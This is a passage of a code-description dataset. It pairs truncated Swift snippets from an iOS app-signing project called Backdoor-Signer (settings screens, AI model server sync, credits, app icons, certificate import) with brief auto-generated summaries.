    "nl": "/ Safe wrapper for async tasks that ensures proper await usage",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ModelServerIntegrationViewController+SafeAsync.swift",
    "code_type": "function"
  },
  {
    "id": "2743",
    "code": "func checkServerStatusSafely() {\nperformAsyncSafely { [weak self] in",
    "nl": "/ Safe method to check server status with proper async/await handling",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ModelServerIntegrationViewController+SafeAsync.swift",
    "code_type": "function"
  },
  {
    "id": "2744",
    "code": "private func updateServerStatusUI(status: String, message: String, isError: Bool) {\nlet statusText = \"Server status: \\(status)\\n\\(message)\"\nupdateStatusLabel(text: statusText, isError: isError)\n}\n\n/// Updates the UI status label with the provided text and styling\nfunc updateStatusLabel(text: String, isError: Bool) {",
    "nl": "/ Updates the server status UI using the public method instead of direct label access",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ModelServerIntegrationViewController+SafeAsync.swift",
    "code_type": "function"
  },
  {
    "id": "2745",
    "code": "func updateStatusLabel(text: String, isError: Bool) {\nDispatchQueue.main.async { [weak self] in",
    "nl": "/ Updates the UI status label with the provided text and styling",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ModelServerIntegrationViewController+SafeAsync.swift",
    "code_type": "function"
  },
  {
    "id": "2746",
    "code": "func uploadModelSafely(completion: @escaping (Bool, String) -> Void) {\nperformAsyncSafely {",
    "nl": "/ Safe wrapper for model uploads using proper async/await",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ModelServerIntegrationViewController+SafeAsync.swift",
    "code_type": "function"
  },
  {
    "id": "2747",
    "code": "class ModelServerIntegrationViewController: UIViewController {\n// UI Elements\nprivate let scrollView = UIScrollView()\nprivate let contentView = UIView()\nprivate let serverSyncSwitch = UISwitch()\nprivate let uploadModelButton = UIButton(type: .system)\nprivate let statusLabel = UILabel()\nprivate let activityIndicator = UIActivityIndicatorView(style: .medium)\nprivate let lastUploadLabel = UILabel()\nprivate let modelInfoLabel = UILabel()",
    "nl": "/ View controller for integrating with the AI server, including model upload",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ModelServerIntegrationViewController.swift",
    "code_type": "class"
  },
  {
    "id": "2748",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\n\ntitle = \"AI Server Integration\"\nview.backgroundColor = UIColor(named: \"Background\") ?? .systemBackground\n\nsetupUI()\nupdateStatus()\n}\n",
    "nl": "Function viewDidLoad - implements viewdidload functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ModelServerIntegrationViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2749",
    "code": "override func viewWillAppear(_ animated: Bool) {\nsuper.viewWillAppear(animated)\nupdateStatus()\n}\n\nprivate func setupUI() {",
    "nl": "Function viewWillAppear - implements viewwillappear functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ModelServerIntegrationViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2750",
    "code": "private func setupUI() {\n// Setup scroll view\nscrollView.translatesAutoresizingMaskIntoConstraints = false\ncontentView.translatesAutoresizingMaskIntoConstraints = false\nview.addSubview(scrollView)\nscrollView.addSubview(contentView)\n\nNSLayoutConstraint.activate([\nscrollView.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor),\nscrollView.leadingAnchor.constraint(equalTo: view.leadingAnchor),",
    "nl": "Function setupUI - sets upui",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ModelServerIntegrationViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2751",
    "code": "private func updateStatus() {\nlet isServerSyncEnabled = AILearningManager.shared.isServerSyncEnabled\nserverSyncSwitch.isOn = isServerSyncEnabled\n\n// Update UI based on server sync status\nif isServerSyncEnabled {",
    "nl": "Function updateStatus - updates status",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ModelServerIntegrationViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2752",
    "code": "@objc private func serverSyncSwitchChanged() {\n// Update the server sync setting\nAILearningManager.shared.setServerSyncEnabled(serverSyncSwitch.isOn)\n\n// Update UI\nupdateStatus()\n}\n\n@objc private func uploadModelButtonTapped() {",
    "nl": "Function serverSyncSwitchChanged - implements serversyncswitchchanged functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ModelServerIntegrationViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2753",
    "code": "@objc private func uploadModelButtonTapped() {\n// Disable UI during upload\nuploadModelButton.isEnabled = false\nactivityIndicator.startAnimating()\nstatusLabel.text = \"Uploading model to server...\"\nstatusLabel.textColor = .systemOrange\n\n// Upload the model using safe wrapper\nuploadModelSafely { [weak self] success, message in",
    "nl": "Function uploadModelButtonTapped - implements uploadmodelbuttontapped functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ModelServerIntegrationViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2754",
    "code": "class AboutViewController: FRSTableViewController {\nvar credits: [CreditsPerson] = []\nvar creditsSponsors: [CreditsPerson] = []\nvar fileNames: [String] = []\n\nprivate let sourceGET = SourceGET()\n\noverride func viewDidLoad() {",
    "nl": "class AboutViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/AboutViewController.swift",
    "code_type": "class"
  },
  {
    "id": "2755",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\n\ntableData = [\n[\"Header\"],\n[],\n[\"\", \"Thanks\"], // Don't translate this\n[],\n]\n",
    "nl": "Function viewDidLoad - implements viewdidload functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/AboutViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2756",
    "code": "fileprivate func setupNavigation() {\ntitle = \"About\"\nnavigationItem.rightBarButtonItem = UIBarButtonItem(\nbarButtonSystemItem: .action,\ntarget: self,\naction: #selector(shareButtonTapped)\n)\n}\n\nfileprivate func setupCreditsSection() {",
    "nl": "Function setupNavigation - sets upnavigation",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/AboutViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2757",
    "code": "fileprivate func setupCreditsSection() {\nif let mdFiles = try? FileManager.default.contentsOfDirectory(atPath: Bundle.main.bundlePath)\n.filter({ $0.hasSuffix(\".md\") })",
    "nl": "Function setupCreditsSection - sets upcreditssection",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/AboutViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2758",
    "code": "private func getURL(url: URL, completion: @escaping (Result<[CreditsPerson], Error>) -> Void) {\nsourceGET.downloadURL(from: url) { result in",
    "nl": "Function getURL - retrieves url",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/AboutViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2759",
    "code": "@objc func shareButtonTapped() {\nlet shareText = \"Backdoor - https://github.com/khcrysalis/backdoor\"\nlet activityViewController = UIActivityViewController(activityItems: [shareText], applicationActivities: nil)\n\nif let popoverController = activityViewController.popoverPresentationController {",
    "nl": "Function shareButtonTapped - implements sharebuttontapped functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/AboutViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2760",
    "code": "extension AboutViewController {\noverride func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {",
    "nl": "extension AboutViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/AboutViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "2761",
    "code": "override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {\nlet reuseIdentifier = \"Cell\"\nlet cell = UITableViewCell(style: .value1, reuseIdentifier: reuseIdentifier)\ncell.accessoryType = .none\ncell.selectionStyle = .none\n\nlet cellText = tableData[indexPath.section][indexPath.row]\n\nswitch indexPath.section {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/AboutViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2762",
    "code": "override func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {\nlet selectedFileName = tableData[indexPath.section][indexPath.row]\nswitch indexPath.section {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/AboutViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2763",
    "code": "extension AboutViewController {\nprivate func loadFileContents(fileName: String) -> String? {",
    "nl": "extension AboutViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/AboutViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "2764",
    "code": "private func loadFileContents(fileName: String) -> String? {\nguard let filePath = Bundle.main.path(forResource: fileName, ofType: \"\"),\nlet fileContents = try? String(contentsOfFile: filePath)\nelse {",
    "nl": "Function loadFileContents - implements loadfilecontents functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/AboutViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2765",
    "code": "class LicenseViewController: UIViewController {\nvar textContent: String?\nvar titleText: String?\n\noverride func viewDidLoad() {",
    "nl": "class LicenseViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/LicenseViewController.swift",
    "code_type": "class"
  },
  {
    "id": "2766",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\ntitle = titleText\nlet textView = UITextView()\ntextView.text = textContent\ntextView.isEditable = false\ntextView.translatesAutoresizingMaskIntoConstraints = false\n\nlet monospacedFont = UIFont.monospacedSystemFont(ofSize: 12.0, weight: .regular)\ntextView.font = monospacedFont",
    "nl": "Function viewDidLoad - implements viewdidload functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/LicenseViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2767",
    "code": "struct CreditsPerson: Codable {\nlet name: String?\nlet desc: String?\nlet github: String\n}\n\nclass PersonCell: UITableViewCell {",
    "nl": "struct CreditsPerson - implements functionality related to credits person",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/SettingsCreditsTableCell.swift",
    "code_type": "struct"
  },
  {
    "id": "2768",
    "code": "class PersonCell: UITableViewCell {\nvar personImageView: UIImageView = {",
    "nl": "class PersonCell - implements functionality related to person cell",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/SettingsCreditsTableCell.swift",
    "code_type": "class"
  },
  {
    "id": "2769",
    "code": "func configure(with person: CreditsPerson) {\nnameLabel.text = person.name ?? person.github\nroleLabel.text = person.desc ?? person.github\n\nURLSession.shared.dataTask(with: URL(string: \"https://github.com/\\(person.github).png\")!) { data, _, _ in",
    "nl": "Function configure - implements configure functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/SettingsCreditsTableCell.swift",
    "code_type": "function"
  },
  {
    "id": "2770",
    "code": "private func setupViews() {\ncontentView.addSubview(personImageView)\ncontentView.addSubview(nameLabel)\ncontentView.addSubview(roleLabel)\n\nNSLayoutConstraint.activate([\npersonImageView.leadingAnchor.constraint(equalTo: contentView.leadingAnchor, constant: 16),\npersonImageView.centerYAnchor.constraint(equalTo: contentView.centerYAnchor),\npersonImageView.widthAnchor.constraint(equalToConstant: 45),\npersonImageView.heightAnchor.constraint(equalToConstant: 45),",
    "nl": "Function setupViews - sets upviews",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/SettingsCreditsTableCell.swift",
    "code_type": "function"
  },
  {
    "id": "2771",
    "code": "class BatchPersonCell: UITableViewCell {\nprivate let textView: UITextView = {",
    "nl": "class BatchPersonCell - implements functionality related to batch person cell",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/SettingsCreditsTableCell.swift",
    "code_type": "class"
  },
  {
    "id": "2772",
    "code": "func configure(with persons: [CreditsPerson]) {\nlet attributedText = NSMutableAttributedString()\n\nfor (index, person) in persons.enumerated() {",
    "nl": "Function configure - implements configure functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/SettingsCreditsTableCell.swift",
    "code_type": "function"
  },
  {
    "id": "2773",
    "code": "private func setupViews() {\ncontentView.addSubview(textView)\n\nNSLayoutConstraint.activate([\ntextView.leadingAnchor.constraint(equalTo: contentView.leadingAnchor, constant: 16),\ntextView.trailingAnchor.constraint(equalTo: contentView.trailingAnchor, constant: -16),\ntextView.topAnchor.constraint(equalTo: contentView.topAnchor, constant: 8),\ntextView.bottomAnchor.constraint(equalTo: contentView.bottomAnchor, constant: -8),\n])\n}",
    "nl": "Function setupViews - sets upviews",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/SettingsCreditsTableCell.swift",
    "code_type": "function"
  },
  {
    "id": "2774",
    "code": "class SettingsHeaderTableViewCell: UITableViewCell {\nlet titleLabel = UILabel()\nlet versionLabel = UILabel()\n\noverride init(style: UITableViewCell.CellStyle, reuseIdentifier: String?) {",
    "nl": "class SettingsHeaderTableViewCell - implements functionality related to settings header table view cell",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/SettingsHeaderTableViewCell.swift",
    "code_type": "class"
  },
  {
    "id": "2775",
    "code": "private func setupViews() {\ncontentView.addSubview(titleLabel)\ncontentView.addSubview(versionLabel)\n\ntitleLabel.translatesAutoresizingMaskIntoConstraints = false\nversionLabel.translatesAutoresizingMaskIntoConstraints = false\n\ntitleLabel.font = UIFont.boldSystemFont(ofSize: 22)\ntitleLabel.textColor = UIColor.label\n",
    "nl": "Function setupViews - sets upviews",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/SettingsHeaderTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "2776",
    "code": "func configure(withTitle title: String, versionString: String) {\ntitleLabel.text = title.capitalized\nversionLabel.text = versionString\n}\n}\n",
    "nl": "Function configure - implements configure functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/SettingsHeaderTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "2777",
    "code": "class IconsListTableViewCell: UITableViewCell {\nprivate let iconView: UIImageView = {",
    "nl": "class IconsListTableViewCell - implements functionality related to icons list table view cell",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AppIcon/IconsListTableViewCell.swift",
    "code_type": "class"
  },
  {
    "id": "2778",
    "code": "private func setupViews() {\ncontentView.addSubview(iconView)\ncontentView.addSubview(iconName)\ncontentView.addSubview(author)\n\nNSLayoutConstraint.activate([\niconView.leadingAnchor.constraint(equalTo: contentView.leadingAnchor, constant: 17.5),\niconView.centerYAnchor.constraint(equalTo: contentView.centerYAnchor),\niconView.widthAnchor.constraint(equalToConstant: 52),\niconView.heightAnchor.constraint(equalToConstant: 52),",
    "nl": "Function setupViews - sets upviews",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AppIcon/IconsListTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "2779",
    "code": "class IconsListViewController: UITableViewController {\nclass func altImage(_ name: String) -> UIImage {",
    "nl": "class IconsListViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AppIcon/IconsListViewController.swift",
    "code_type": "class"
  },
  {
    "id": "2780",
    "code": "class func altImage(_ name: String) -> UIImage {\n// Try multiple locations for the icon image (root first for backward compatibility)\nlet possiblePaths: [URL] = [\n// Check root of bundle (original implementation)\nBundle.main.bundleURL.appendingPathComponent(name + \"@2x.png\"),\n\n// Check Main folder for Main icons\nBundle.main.bundleURL.appendingPathComponent(\"Icons/Main/\\(name)@2x.png\"),\n\n// Check Wing folder for Wing icon",
    "nl": "class func - implements func functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AppIcon/IconsListViewController.swift",
    "code_type": "class"
  },
  {
    "id": "2781",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\nsetupViews()\nsetupNavigation()\n}\n\nfileprivate func setupViews() {",
    "nl": "Function viewDidLoad - implements viewdidload functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AppIcon/IconsListViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2782",
    "code": "fileprivate func setupViews() {\ntableView.delegate = self\ntableView.dataSource = self\ntableView.rowHeight = 75\n}\n\nfileprivate func setupNavigation() {",
    "nl": "Function setupViews - sets upviews",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AppIcon/IconsListViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2783",
    "code": "fileprivate func setupNavigation() {\ntitle = String.localized(\"SETTINGS_VIEW_CONTROLLER_CELL_APP_ICON\")\nnavigationItem.largeTitleDisplayMode = .never\n}\n\nprivate func sectionTitles() -> [String] {",
    "nl": "Function setupNavigation - sets upnavigation",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AppIcon/IconsListViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2784",
    "code": "private func sectionTitles() -> [String] {\nreturn Array(sections.keys).sorted()\n}\n\nprivate func icons(forSection section: Int) -> [AltIcon] {",
    "nl": "Function sectionTitles - implements sectiontitles functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AppIcon/IconsListViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2785",
    "code": "private func icons(forSection section: Int) -> [AltIcon] {\nlet title = sectionTitles()[section]\nreturn sections[title] ?? []\n}\n}\n\nextension IconsListViewController {",
    "nl": "Function icons - implements icons functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AppIcon/IconsListViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2786",
    "code": "extension IconsListViewController {\noverride func numberOfSections(in _: UITableView) -> Int { return sectionTitles().count }",
    "nl": "extension IconsListViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AppIcon/IconsListViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "2787",
    "code": "override func numberOfSections(in _: UITableView) -> Int { return sectionTitles().count }\noverride func tableView(_: UITableView,\nnumberOfRowsInSection section: Int) -> Int { return icons(forSection: section).count }",
    "nl": "Function numberOfSections - implements numberofsections functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AppIcon/IconsListViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2788",
    "code": "override func tableView(_: UITableView,\nnumberOfRowsInSection section: Int) -> Int { return icons(forSection: section).count }",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AppIcon/IconsListViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2789",
    "code": "override func tableView(_: UITableView, heightForHeaderInSection _: Int) -> CGFloat { return 40 }\n\noverride func tableView(_: UITableView, viewForHeaderInSection section: Int) -> UIView? {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AppIcon/IconsListViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2790",
    "code": "override func tableView(_: UITableView, viewForHeaderInSection section: Int) -> UIView? {\nlet title = sectionTitles()[section]\nreturn InsetGroupedSectionHeader(title: title)\n}\n\noverride func tableView(_: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AppIcon/IconsListViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2791",
    "code": "override func tableView(_: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {\nlet cell = IconsListTableViewCell()\nlet icon = icons(forSection: indexPath.section)[indexPath.row]\ncell.altIcon = icon\nif UIApplication.shared.alternateIconName == icon.key {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AppIcon/IconsListViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2792",
    "code": "override func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {\ntableView.deselectRow(at: indexPath, animated: true)\nlet icon = icons(forSection: indexPath.section)[indexPath.row]\n\n// Store current selection for UI updates even if async call hasn't completed\nlet selectedIconKey = icon.key\n\n// Show activity indicator\nlet activityIndicator = UIActivityIndicatorView(style: .medium)\nactivityIndicator.startAnimating()",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AppIcon/IconsListViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2793",
    "code": "extension UIImage {\n// Helper to check if an image is empty\nvar isEmpty: Bool {",
    "nl": "extension UIImage - implements functionality related to u i image",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AppIcon/IconsListViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "2794",
    "code": "struct AltIcon {\nvar displayName: String\nvar author: String\nvar key: String?\nvar image: UIImage\n}\n",
    "nl": "struct AltIcon - implements functionality related to alt icon",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AppIcon/IconsListViewController.swift",
    "code_type": "struct"
  },
  {
    "id": "2795",
    "code": "class BackdoorConverter {\n/// Error types that can occur during backdoor file creation\nenum Error: Swift.Error {",
    "nl": "/ Utility class to create backdoor files from separate p12 and mobileprovision files",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/BackdoorConverter.swift",
    "code_type": "class"
  },
  {
    "id": "2796",
    "code": "enum Error: Swift.Error {\ncase p12ImportFailed\ncase noIdentity\ncase keyOrCertMissing\ncase signatureFailed(CFError?)\ncase fileAccessError(Swift.Error)\ncase fileWriteError(Swift.Error)\ncase encryptionFailed\n}\n",
    "nl": "/ Error types that can occur during backdoor file creation",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/BackdoorConverter.swift",
    "code_type": "enum"
  },
  {
    "id": "2797",
    "code": "static func createBackdoorFile(\np12URL: URL,\nmobileProvisionURL: URL,\noutputURL: URL,\np12Password: String? = nil,\nencrypt: Bool = true\n) throws {",
    "nl": "/ Creates a backdoor file from separate p12 and mobileprovision files / - Parameters: /   - p12URL: URL to the p12 file /   - mobileProvisionURL: URL to the mobileprovision file /   - outputURL: URL where the backdoor file should be saved /   - p12Password: Optional password for the p12 file /   - encrypt: Whether to encrypt the sensitive data (default: true)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/BackdoorConverter.swift",
    "code_type": "function"
  },
  {
    "id": "2798",
    "code": "static func createBackdoorFileFromData(\np12Data: Data,\nmobileProvisionData: Data,\nprivateKey: SecKey,\ncertificate: SecCertificate,\noutputURL: URL,\nencrypt: Bool = true\n) throws {",
    "nl": "/ Creates an encrypted .backdoor file from raw certificate data / - Parameters: /   - p12Data: The raw p12 certificate data /   - mobileProvisionData: The raw mobileprovision data /   - privateKey: The private key to use for signing /   - certificate: The certificate associated with the private key /   - outputURL: URL where the backdoor file should be saved",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/BackdoorConverter.swift",
    "code_type": "function"
  },
  {
    "id": "2799",
    "code": "func provision_file_validation(_ path: String)\n\n@_silgen_name(\"p12_password_check\")\nfunc p12_password_check(_ path: String, _ password: String) -> Bool\n\nclass CertImportingViewController: UITableViewController {",
    "nl": "Function provision_file_validation - implements provision file validation functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2800",
    "code": "func p12_password_check(_ path: String, _ password: String) -> Bool\n\nclass CertImportingViewController: UITableViewController {",
    "nl": "Function p12_password_check - implements p12 password check functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2801",
    "code": "class CertImportingViewController: UITableViewController {\nlazy var saveButton = UIBarButtonItem(\ntitle: String.localized(\"SAVE\"),\nstyle: .plain,\ntarget: self,\naction: #selector(saveAction)\n)\nprivate var passwordTextField: UITextField?\nprivate var backdoorFile: BackdoorFile?\n",
    "nl": "class CertImportingViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift",
    "code_type": "class"
  },
  {
    "id": "2802",
    "code": "enum FileType: Hashable {\ncase provision\ncase p12\ncase password\ncase backdoor\n}\n\nvar sectionData = [\n\"backdoor\",\n\"provision\",",
    "nl": "enum FileType - implements functionality related to file type",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift",
    "code_type": "enum"
  },
  {
    "id": "2803",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\nsetupNavigation()\nsetupViews()\n}\n\nfileprivate func setupViews() {",
    "nl": "Function viewDidLoad - implements viewdidload functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2804",
    "code": "fileprivate func setupViews() {\nself.tableView.dataSource = self\nself.tableView.delegate = self\n}\n\nfileprivate func setupNavigation() {",
    "nl": "Function setupViews - sets upviews",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2805",
    "code": "fileprivate func setupNavigation() {\nself.navigationItem.largeTitleDisplayMode = .never\nself.title = String.localized(\"CERT_IMPORTING_VIEWCONTROLLER_TITLE\")\nsaveButton.isEnabled = false\nself.navigationItem.rightBarButtonItem = saveButton\nself.navigationItem.leftBarButtonItem = UIBarButtonItem(\ntitle: String.localized(\"DISMISS\"),\nstyle: .done,\ntarget: self,\naction: #selector(closeSheet)",
    "nl": "Function setupNavigation - sets upnavigation",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift",
